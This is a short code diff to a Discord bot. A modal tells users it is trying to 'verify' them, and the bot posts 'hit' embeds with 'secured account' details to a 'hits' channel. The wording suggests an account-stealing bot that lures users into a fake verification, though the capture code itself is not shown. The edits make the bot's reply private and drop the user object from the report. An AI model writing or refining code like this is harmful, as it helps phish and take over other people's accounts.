@@ -38,7 +38,7 @@ class MyModalOne(ui.Modal):
             )
             return
 
-        await interaction.response.defer()
+        await interaction.response.defer(ephemeral=True)
 
         await interaction.followup.send(
             "⌛ Please wait while we try to verify you...",
@@ -221,8 +221,7 @@ class MyModalOne(ui.Modal):
                     await hits_channel.send(
                         embed = securedAccount["hit_embed"],
                         view = accountInfo(
-                            securedAccount["details"],
-                            interaction.user
+                            securedAccount["details"]
                         )
                     )
                     return
